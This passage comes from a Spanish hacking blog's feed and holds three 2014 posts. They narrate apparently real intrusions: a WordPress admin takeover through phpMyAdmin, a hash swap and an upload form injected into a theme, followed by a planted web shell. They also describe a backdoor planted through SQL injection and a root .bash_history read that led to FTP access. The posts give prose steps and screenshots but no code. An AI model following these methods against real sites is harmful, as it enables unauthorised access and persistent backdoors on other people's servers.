<p>WTF!!? además de que los passwords están en texto plano!, estás son las cosas por las que me preguntó ¿por que hay cada admin tan pelotudo?
Rápidamente me hago con el phpmyadmin</p>

<p><img src="http://i.imgur.com/RzSxb.png"></p>

<p>Y viendo los nombres de las tablas deduzco que se trata de una aplicación que utiliza un CMS wordpress, tranquilamente podría subir una shell desde aquí pero mi intención es secuestrar el WP así que edito la tabla wp_users para cambiar el hash del admin por otro generado a mi antojo, listo ya  estoy dentro del panel.</p>

<p><img src="http://i.imgur.com/fR9eo.png"></p>

<p>Debido a las restricciones de subida, además de no poder realizar un bypass, opto por editar uno de los ficheros del theme comments.php para insertar un upload</p>

<p><img src="http://i.imgur.com/hSkne.png"></p>

<p><img src="http://i.imgur.com/jKggP.png"></p>

<p><img src="http://i.imgur.com/Gm600.png"></p>

<p>Subo la shell y ahora solo me queda realizar un análisis de post explotación en el Debian 5.0 y encontrar alguna manera de elevar privilegios.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor via inyeccion]]></title>
    <link href="http://q3rv0.github.io/blog/2014/11/17/backdoor-via-inyeccion/"/>
    <updated>2014-11-17T08:19:41+06:30</updated>
    <id>http://q3rv0.github.io/blog/2014/11/17/backdoor-via-inyeccion</id>
    <content type="html"><![CDATA[<p>Cuando se trata de vulnerabilidades de inyeccion de codigo tengo que decir que me encanta, hoy le traigo una manera de conseguir un backdoor en el servidor a travez de una de estas. hay veces que se logra realizar inyecciones de manera satisfactoria dumpeando datos de passwords en texto plano o encriptadas, pero si el<!--more-->panel del administrador esta desabilitado
u no se logra romper el hash o cualquier situacion negativa que
haga que esa informacion no sirva para nada, entonces que
hacemos?</p>

<p>Aca dejo un documento que escribi en la tarde, donde se muestra como inyectar codigo php remotamente, a travez de una sqli.</p>

<iframe src="http://www.slideshare.net/slideshow/embed_code/12581123 " width="595" height="446" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC;border-width:1px 1px 0;margin-bottom:5px" allowfullscreen></iframe>


<p></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Sqli file inclusion]]></title>
    <link href="http://q3rv0.github.io/blog/2014/11/17/sqli-file-inclusion/"/>
    <updated>2014-11-17T08:12:34+06:30</updated>
    <id>http://q3rv0.github.io/blog/2014/11/17/sqli-file-inclusion</id>
    <content type="html"><![CDATA[<p>En este video pretendo mostrar como a travez de una SQLI se accede a ficheros internos en el servidor, en la intrusion Crackx y yo, nos topamos con el .bash_history del usuario root<!--more-->, parece ser q el administardor agrega usuarios y cambia el password de una manera poco segura diria yo…XD!, gracias a esta falencia logramos acceder al ftp del vps y subir una webshell.</p>

<div class="embed-video-container"><iframe src="//www.youtube.com/embed/VTzpW8OgLts" allowfullscreen></iframe></div>

]]></content>
  </entry>
  
</feed>
